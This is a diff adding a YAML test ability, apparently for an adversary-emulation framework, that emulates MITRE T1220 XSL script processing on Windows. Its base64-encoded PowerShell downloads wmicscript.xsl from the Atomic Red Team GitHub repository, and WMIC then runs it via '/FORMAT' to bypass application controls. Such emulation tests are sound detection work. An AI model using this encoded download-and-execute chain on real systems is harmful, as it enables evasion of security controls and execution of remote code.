@@ -1,0 +1,18 @@
+- id: 7b6e7ad8-6a56-5b74-9587-9fe9ee90a882
+  name: Soumaia ART Tests - WMIC bypass using local XSL file
+  description: Executes the code specified within a XSL script using a local payload.
+  tactic: stealth
+  technique:
+    attack_id: T1220
+    name: XSL Script Processing
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAHcAbQBpAGMAcwBjAHIAaQBwAHQALgB4AHMAbAAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
+          if not "%ERRORLEVEL%"=="0" (
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXAB3AG0AaQBjAHMAYwByAGkAcAB0AC4AeABzAGwAIgApACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABJAGcAbgBvAHIAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AcgBlAGQAYwBhAG4AYQByAHkAYwBvAC8AYQB0AG8AbQBpAGMALQByAGUAZAAtAHQAZQBhAG0ALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AYQB0AG8AbQBpAGMAcwAvAFQAMQAyADIAMAAvAHMAcgBjAC8AdwBtAGkAYwBzAGMAcgBpAHAAdAAuAHgAcwBsACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAC4AXAB3AG0AaQBjAHMAYwByAGkAcAB0AC4AeABzAGwAIgAKAA==
+          )
+          wmic process list /FORMAT:".\wmicscript.xsl"
+        payloads:
+        - wmicscript.xsl
